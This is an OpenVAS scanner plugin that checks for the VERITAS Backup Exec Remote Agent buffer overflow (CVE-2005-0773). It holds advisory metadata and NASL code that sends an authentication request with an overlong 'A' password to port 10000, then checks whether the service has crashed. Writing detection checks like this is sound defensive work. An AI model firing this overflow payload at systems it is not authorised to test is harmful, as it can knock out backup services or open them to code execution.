###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_veritas_backup_exec_agent_win_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# VERITAS Backup Exec Remote Agent Windows Servers BOF Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to overflow a buffer and
  execute arbitrary code on the system.
  Impact Level: System/Application";
tag_affected = "Veritas Backup Exec Remote Agent versions 9.0 through 10.0 for Windows Servers";
tag_insight = "The flaw is due to insufficient input validation on CONNECT_CLIENT_AUTH
  requests. CONNECT_CLIENT_AUTH requests sent with an authentication method type
  '3' indicating Windows user credentials, and an overly long password argument
  can overflow the buffer and lead to arbitrary code execution.";
tag_solution = "Upgrade to Veritas Backup Exec Remote Agent 10.0 rev. 5520 for Windows Servers
  For updates refer to http://www.symantec.com/index.jsp";
tag_summary = "This host is running VERITAS Backup Exec Remote Agent for Windows
  Servers and is prone to buffer overflow vulnerability.";

if(description)
{
  script_id(802985);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2005-0773");
  script_bugtraq_id(14022);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-15 10:32:37 +0530 (Mon, 15 Oct 2012)");
  script_name(" VERITAS Backup Exec Remote Agent Windows Servers BOF Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/17624");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/15789");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1014273");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/492105");
  script_xref(name : "URL" , value : "http://www.us-cert.gov/cas/techalerts/TA05-180A.html");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/vulnwatch/2005-q2/0073.html");

  script_description(desc);
  script_summary("Check if VERITAS Backup Exec Remote Agent for Windows Servers is prone to BOF");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports(10000);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

## Variable Initialization
port = "";
soc = "";
buf = "";
req = "";

## Get the port
port = 10000;

## Check port state
if(!get_port_state(port)){
  exit (0);
}

## open socket
soc = open_sock_tcp (port);
if(!soc){
  exit (0);
}

buf = recv(socket:soc, length:40);
if(!buf || hexstr(buf) !~ "^80000024")
{
  close(soc);
  exit(0);
}

## Construct the connect request
req = raw_string(0x80, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x01,
                 0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03);

send (socket:soc, data:req);
buf = recv (socket:soc, length:32);

if(!buf || hexstr(buf) !~ "^8000001c")
{
  close(soc);
  exit(0);
}

## Construct CONNECT_CLIENT_AUTH request
req = raw_string (0x80, 0x00, 0x04, 0x3E, 0x00, 0x00, 0x00, 0x02,
                  0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x09, 0x01, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03,
                  0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00) +
                  crap(data:"A", length:0x400) +
                  raw_string (0x00, 0x00, 0x00, 0x04, 0x04);

## Send request
send (socket:soc, data:req);

## Close the socket
close (soc);

sleep(5);

## Open the socket to confirm vulnerability
soc = open_sock_tcp(port);
if(!soc)
{
  security_hole(port);
  exit(0);
}

close(soc);
